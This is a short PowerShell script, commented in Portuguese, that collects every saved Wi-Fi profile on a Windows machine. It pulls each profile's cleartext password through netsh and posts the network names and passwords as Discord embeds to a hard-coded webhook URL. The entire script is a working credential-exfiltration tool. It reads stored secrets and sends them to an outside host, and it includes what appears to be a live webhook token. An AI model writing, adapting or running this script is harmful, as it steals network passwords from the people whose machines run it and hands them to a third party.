$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"

# Obter perfis Wi-Fi
$profiles = netsh wlan show profile | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ':')[1].Trim() }

$embeds = @()

foreach ($p in $profiles) {
    $details = netsh wlan show profile name="$p" key=clear
    $passLine = $details | Select-String "Key Content"
    
    if ($passLine) { 
        $password = ($passLine -split ':')[1].Trim() 
    } else { 
        $password = 'Sem senha / não encontrado' 
    }
    
    # Criar um embed para cada rede
    $embed = @{
        title = "📶 Rede Wi-Fi: $p"
        description = "**Senha:** `$password`"
        color = 5814783
        timestamp = Get-Date -Format "o"
    }
    
    $embeds += $embed
}

# Se não encontrar redes
if ($embeds.Count -eq 0) {
    $embeds = @(@{
        title = "❌ Nenhuma rede Wi-Fi encontrada"
        description = "Não foram detectadas redes Wi-Fi salvas"
        color = 16711680
    })
}

$payload = @{
    embeds = $embeds
    username = "Wi-Fi Scanner"
    avatar_url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
}

try {
    $body = $payload | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
    Write-Host "✅ Relatório enviado com sucesso!" -ForegroundColor Green
}
catch {
    Write-Host "❌ Erro: $($_.Exception.Message)" -ForegroundColor Red
}
